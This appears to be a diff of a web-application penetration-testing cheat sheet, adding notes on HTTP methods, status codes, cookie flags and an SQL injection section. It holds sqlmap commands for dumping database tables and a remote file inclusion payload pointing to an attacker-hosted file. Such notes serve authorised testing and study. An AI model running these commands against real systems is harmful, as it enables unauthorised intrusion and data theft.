@@ -1,29 +1,37 @@
 Web Apps
 
 
-# Error Codes
+# Request Methods
 
-1xx Informational
-100 Continue
+GET  Passes all query material in the URL query string.
+POST Passes all requested data in the HTTP request body.
+------------------------------------------------------------------------------------------------------
 
-2xx Success
-200 OK
+# Common Response Status Codes
 
-3xx Redirection
-301 Moved Permanently
-302 Found
+1xx  Informational
+100  Continue
 
-4xx Client Error
-401 Unauthorized
-403 Forbidden
-404 Not Found
+2xx  Success
+200  OK
 
-5xx Server Error
-500 Internal Server Error
-501 Not Implemented
-502 Bad Gateway
-503 Service Unavailable
-504 Gateway Timeout
+3xx  Redirection
+301  Moved Permanently
+302  Found
+
+4xx  Client Error
+401  Unauthorized
+403  Forbidden
+404  Not Found
+
+5xx  Server Error
+500  Internal Server Error
+------------------------------------------------------------------------------------------------------
+
+# Cookies
+
+Secure - only send over encrypted channel
+HttpOnly - prevents JavaScript from accessing the cookie
 ------------------------------------------------------------------------------------------------------
 
 # Apache version, eTag, HTTP Basic Authentication Enabled
@@ -99,6 +107,18 @@ Firefox > Web Developer Toolbar > Information > View Response Headers
 
 http://localhost/index.php?page=http://attackersHost/evil.txt
 ------------------------------------------------------------------------------------------------------
+
+# SQLi
+
+Use Burp to trap a request. Copy the request to /root/request.txt.
+
+./sqlmap -r /root/request.txt
+./sqlmap -r /root/request.txt -p <parameter to test> --current-user
+./sqlmap -r /root/request.txt -D <database> --tables              Show all tables in database
+./sqlmap -r /root/request.txt -D <database> -T <table> --dump     Show all data in table
+------------------------------------------------------------------------------------------------------
+
+
 
 # TRACE / TRACK methods allowed
 
